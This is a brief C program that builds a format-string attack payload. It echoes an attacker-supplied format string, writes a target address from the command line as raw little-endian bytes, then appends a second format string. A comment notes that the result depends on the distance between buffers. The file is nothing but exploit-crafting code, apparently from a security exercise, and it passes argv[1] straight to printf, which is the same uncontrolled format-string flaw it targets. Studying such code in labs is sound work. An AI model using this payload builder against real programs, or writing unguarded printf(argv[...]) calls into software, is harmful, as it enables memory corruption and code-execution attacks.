#include <stdio.h>

int main(int argc, char ** argv) {
  int buff_addr = atoi(argv[3]);

  // warning this depends on the distance between the two buffers
  printf(argv[1]);
  printf("%c", buff_addr & 0xff);
  printf("%c", (buff_addr>>8) & 0xff);
  printf("%c", (buff_addr>>16) & 0xff);
  printf("%c", (buff_addr>>24) & 0xff);
  printf(argv[2]);
  printf("\n");
  return 0;
}
